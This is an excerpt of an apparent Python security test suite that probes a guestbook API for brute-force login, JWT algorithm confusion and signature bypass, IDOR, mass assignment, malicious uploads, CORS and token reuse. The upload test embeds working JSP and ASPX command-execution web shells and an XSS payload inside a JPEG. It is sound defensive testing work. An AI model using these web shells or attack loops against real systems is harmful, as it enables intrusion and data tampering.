...
class TestPenetrationScenarios:
    ...
    def test_advanced_brute_force(self):
        ...
        with allure.step("Executing brute force attack"):
            for password in common_passwords:
                ...
                if response.status_code == 200:
                    ...
                    allure.attach(f"Successful login with password: {password}", 
                                 name="Brute Force Success", attachment_type=allure.attachment_type.TEXT)
                elif response.status_code == 429:
                    rate_limited = True
                    allure.attach(f"Rate limited after {failed_attempts} attempts", 
                                 name="Rate Limiting", attachment_type=allure.attachment_type.TEXT)
                    break
                else:
                    failed_attempts += 1
        ...
        if not rate_limited and failed_attempts > 5:
            allure.attach("No rate limiting detected - brute force possible", 
                         name="Brute Force Vulnerability", attachment_type=allure.attachment_type.TEXT)
        
        if len(successful_logins) > 1:
            allure.attach(f"Multiple weak passwords found: {successful_logins}", 
                         name="Weak Password Issue", attachment_type=allure.attachment_type.TEXT)
    ...
    def test_jwt_token_manipulation(self, auth_token):
        ...
        try:
            ...
            if len(parts) == 3:
                ...
                allure.attach(f"JWT Header: {header}", 
                             name="JWT Structure", attachment_type=allure.attachment_type.TEXT)
                allure.attach(f"JWT Payload: {payload}", 
                             name="JWT Payload", attachment_type=allure.attachment_type.TEXT)
                ...
                with allure.step("Testing algorithm confusion"):
                    ...
                    test_headers = {"Authorization": f"Bearer {none_token}", "Content-Type": "application/json"}
                    response = requests.get(f"{BASE_URL}/api/guestbook", headers=test_headers)
                    
                    if response.status_code == 200:
                        allure.attach("Algorithm confusion attack successful!", 
                                     name="Critical JWT Vulnerability", attachment_type=allure.attachment_type.TEXT)
                ...
                with allure.step("Testing payload manipulation"):
                    ...
                    test_headers = {"Authorization": f"Bearer {manipulated_token}", "Content-Type": "application/json"}
                    response = requests.get(f"{BASE_URL}/api/guestbook", headers=test_headers)
                    
                    if response.status_code == 200:
                        allure.attach("Payload manipulation successful - signature not verified!", 
                                     name="JWT Signature Bypass", attachment_type=allure.attachment_type.TEXT)
                    else:
                        allure.attach("Payload manipulation blocked - good signature verification", 
                                     name="Good JWT Security", attachment_type=allure.attachment_type.TEXT)
        
        except Exception as e:
            allure.attach(f"JWT manipulation test failed: {str(e)}", 
                         name="JWT Test Error", attachment_type=allure.attachment_type.TEXT)
    ...
    def test_advanced_idor(self, auth_token):
        ...
        for i in range(3):
            ...
            response = requests.post(f"{BASE_URL}/api/guestbook", json=entry_data, headers=headers)
        ...
        if created_entries:
            ...
            with allure.step("Testing ID enumeration"):
                ...
                for test_id in range(min_id - 10, max_id + 10):
                    response = requests.get(f"{BASE_URL}/api/guestbook/{test_id}", headers=headers)
                    if response.status_code == 200:
                        accessible_entries.append(test_id)
                
                if len(accessible_entries) > len(created_entries):
                    allure.attach(f"ID enumeration possible: {len(accessible_entries)} entries accessible", 
                                 name="IDOR Enumeration", attachment_type=allure.attachment_type.TEXT)
            ...
            with allure.step("Testing IDOR with different methods"):
                ...
                modified_data = {"name": "Hacker", "email": "hacker@evil.com", "comment": "Pwned!"}
                response = requests.put(f"{BASE_URL}/api/guestbook/{test_id}", 
                                      json=modified_data, headers=headers)
                
                if response.status_code == 200:
                    # Verify modification
                    get_response = requests.get(f"{BASE_URL}/api/guestbook/{test_id}", headers=headers)
                    if get_response.status_code == 200:
                        entry_data = get_response.json()
                        if entry_data.get("name") == "Hacker":
                            allure.attach("IDOR modification successful", 
                                         name="IDOR Write Access", attachment_type=allure.attachment_type.TEXT)
                
                # Try to delete entry
                response = requests.delete(f"{BASE_URL}/api/guestbook/{test_id}", headers=headers)
                if response.status_code == 200:
                    allure.attach("IDOR deletion successful", 
                                 name="IDOR Delete Access", attachment_type=allure.attachment_type.TEXT)
        ...
        for payload in mass_assignment_payloads:
            with allure.step(f"Testing mass assignment with {len(payload)} fields"):
                ...
                if response.status_code == 201:
                    ...
                    extra_fields = []
                    expected_fields = {"userId", "name", "email", "comment", "created_at"}
                    ...
                    if extra_fields:
                        allure.attach(f"Mass assignment successful: {extra_fields}", 
                                     name="Mass Assignment Vulnerability", attachment_type=allure.attachment_type.TEXT)
                    ...
                    if dangerous_values:
                        allure.attach(f"Dangerous mass assignment: {dangerous_values}", 
                                     name="Critical Mass Assignment", attachment_type=allure.attachment_type.TEXT)
    ...
    def test_file_upload_attack(self, auth_token):
        ...
        malicious_files = [
            ...
            ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "text/plain"),
            ("shell.aspx", b"<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(Request[\"cmd\"]);%>", "text/plain"),
            ...
            ("image.jpg", b"\xFF\xD8\xFF\xE0" + b"<script>alert('XSS')</script>", "image/jpeg"),
        ]
        ...
        for filename, content, content_type in malicious_files:
            with allure.step(f"Testing malicious file: {filename}"):
                ...
                if response.status_code == 200:
                    allure.attach(f"Malicious file upload successful: {filename}", 
                                 name="File Upload Vulnerability", attachment_type=allure.attachment_type.TEXT)
                elif response.status_code in [400, 415, 422]:
                    allure.attach(f"Malicious file rejected: {filename}", 
                                 name="Good File Validation", attachment_type=allure.attachment_type.TEXT)
    ...
    def test_cors_attack(self, auth_token):
        ...
        for origin in malicious_origins:
            with allure.step(f"Testing CORS with malicious origin: {origin}"):
                ...
                response = requests.options(f"{BASE_URL}/api/guestbook", headers=headers)
                ...
                if allowed_origin == origin or allowed_origin == "*":
                    if allow_credentials and allow_credentials.lower() == "true":
                        allure.attach(f"Dangerous CORS: {origin} allowed with credentials", 
                                     name="CORS Vulnerability", attachment_type=allure.attachment_type.TEXT)
                    else:
                        allure.attach(f"CORS allows {origin} but no credentials", 
                                     name="CORS Risk", attachment_type=allure.attachment_type.TEXT)
                ...
                if allowed_origin:
                    ...
                    actual_response = requests.get(f"{BASE_URL}/api/guestbook", headers=actual_headers)
                    
                    if actual_response.status_code == 200:
                        allure.attach(f"Cross-origin request successful from {origin}", 
                                     name="CORS Attack Success", attachment_type=allure.attachment_type.TEXT)
    ...
    def test_session_fixation(self):
        ...
        with allure.step("Testing token reuse scenarios"):
            # Get initial token
            response1 = requests.post(f"{BASE_URL}/api/login", json={
                "username": "admin",
            ...
            if response1.status_code == 200:
                ...
                response2 = requests.post(f"{BASE_URL}/api/login", json={
                    "username": "admin",
                    "password": "password123"
                })
                ...
                if response2.status_code == 200:
                    ...
                    if test1.status_code == 200 and test2.status_code == 200:
                        allure.attach("Multiple concurrent tokens allowed (JWT stateless behavior)", 
                                     name="Token Behavior", attachment_type=allure.attachment_type.TEXT)
                        
                        # Check if tokens are identical (would be bad)
                        if token1 == token2:
                            allure.attach("Identical tokens generated - potential security issue", 
                                         name="Token Generation Issue", attachment_type=allure.attachment_type.TEXT)